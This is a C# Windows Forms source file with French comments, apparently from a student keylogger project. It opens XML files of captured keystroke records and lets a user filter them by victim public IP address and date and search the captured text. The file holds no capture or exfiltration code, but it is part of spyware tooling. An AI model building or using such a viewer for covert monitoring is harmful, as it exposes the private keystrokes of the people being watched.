using System;
using System.Diagnostics;
using System.Windows.Forms;
using ProjetKeyLogger;

namespace ProjetEspionReporting
{
    public partial class Reporting : Form
    {
        CollectionEnregistrement collection_enregistrement = new CollectionEnregistrement();

        public Reporting()
        {
            InitializeComponent();
        }

        private void ouvrirToolStripMenuItem_Click(object sender, EventArgs e)
        {

            //Chargement du fichier XML
            if (this.openFileDialog_ouvrir.ShowDialog() == DialogResult.OK)
            {

                //Instanciation de la collection
                collection_enregistrement = new CollectionEnregistrement();

                // pour chaque documents
                foreach (String file in openFileDialog_ouvrir.FileNames)
                {
                    //Pour chaque enregistrement
                    foreach (Enregistrement enregistrement in CollectionEnregistrement.loadFromXML(file).List_Enregistrement)
                    {
                        //On ajoute l'enregistrement 
                        collection_enregistrement.ajouter(enregistrement);

                        //On affiche la date dans la liste d'enregistrement
                        this.listBox_enregistrements.Items.Add(enregistrement.Date.ToString());

                    }

                }

                //On met a jour les comboBox date et adresses
                this.initComboBox();

            }

        }

        private void listBox_enregistrements_SelectedIndexChanged(object sender, EventArgs e)
        {

            //Pour chaque enregistrement de la collection
            foreach (Enregistrement enregistrement in collection_enregistrement.List_Enregistrement)
            {
                //si la date et l'heure correspondent a l'enregistrement selectionné dans la liste
                //et
                //si l'adresse correspond au combobox de filtre sur les adresse ou si il n'y a pas de filtres

                if (enregistrement.Date.ToString().Contains(this.listBox_enregistrements.SelectedItem.ToString()) && enregistrement.Adresse_Ip_Publique.Contains(comboBox_adresse.SelectedIndex.ToString()))
                {
                    //on affiche le contenu de l'enregistrement dans le label
                    label_contenu.Text = enregistrement.Contenu;
                    break;
                 }
            }
            
        }

        private void initComboBox()
        {
            //pour chaque enregistrements de la collection
            foreach (Enregistrement enregistrement in collection_enregistrement.List_Enregistrement)
            {
                //Si l'adresse n'existe pas dans la liste
                if(comboBox_adresse.Items.Contains(enregistrement.Adresse_Ip_Publique) == false){
                    //Alors on ajoute un item au comboBox
                    comboBox_adresse.Items.Add(enregistrement.Adresse_Ip_Publique);
                }

                //Si la date n'existe pas dans la liste
                if (comboBox_date.Items.Contains(enregistrement.Date.Date.ToString("dd/MM/yyyy")) == false)
                {
                    Debug.WriteLine(comboBox_date.Items.ToString());
                    Debug.WriteLine(enregistrement.Date.Date.ToString("dd/MM/yyyy"));
                    //Alors on ajoute un item au comboBox
                    comboBox_date.Items.Add(enregistrement.Date.Date.ToString("dd/MM/yyyy"));
                }

            }
            //Item par défaut
            comboBox_adresse.SelectedItem = comboBox_adresse.Items[0].ToString();

            //Item par défaut
            comboBox_date.SelectedItem = comboBox_date.Items[0].ToString();
        }


        //Mise a jour de la listBox (Appelé lors des modifiaction de texte dans la rechere ou dans la modificationd des combobox)
        private void updateListBox(object sender, EventArgs e)
        {
            //on vide la listBox
            listBox_enregistrements.Items.Clear();
            //On vide le label
            label_contenu.Text = "";

            //Pour chaque element de la colection
            foreach (Enregistrement enregistrement in collection_enregistrement.List_Enregistrement)
            {
                //Si les deux combobox ont bien été initialisé
                if (comboBox_adresse.SelectedItem != null && comboBox_date.SelectedItem != null)
                {
                    //Si l'enregistrement vient de l'adresse selectioné
                    //Et si il correspond a la date selectionné
                    if (enregistrement.Adresse_Ip_Publique == comboBox_adresse.SelectedItem.ToString() && enregistrement.Date.ToString().Contains(comboBox_date.SelectedItem.ToString()))
                    {
                        //Si le textBox de recherche de mot n'est pas vide 
                        if (textBox_recherche.Text != "")
                        {
                            //Si l'enregistrement n'est pas vide non plus
                            if (enregistrement.Contenu != null) {

                                //Si le contenu de l'enregistrement contient le mot recherché
                                if (enregistrement.Contenu.Contains(textBox_recherche.Text.ToString()))
                                {
                                    //Alors on ajoute l'enregistrement a la liste
                                    listBox_enregistrements.Items.Add(enregistrement.Date.ToString());
                                }
                            }
                        }
                        //Si aucune recherche n'a été effectué
                        else
                        {
                            //Alors on ajoute l'enregistrement à la liste
                            listBox_enregistrements.Items.Add(enregistrement.Date.ToString());
                        }
                    }
                }
                //Si il existe des enregistrement correspondant aux collection
                if(listBox_enregistrements.Items.Count > 0)
                {
                    listBox_enregistrements.SelectedItem = listBox_enregistrements.Items[0].ToString();
                }
            }
        }
    }
}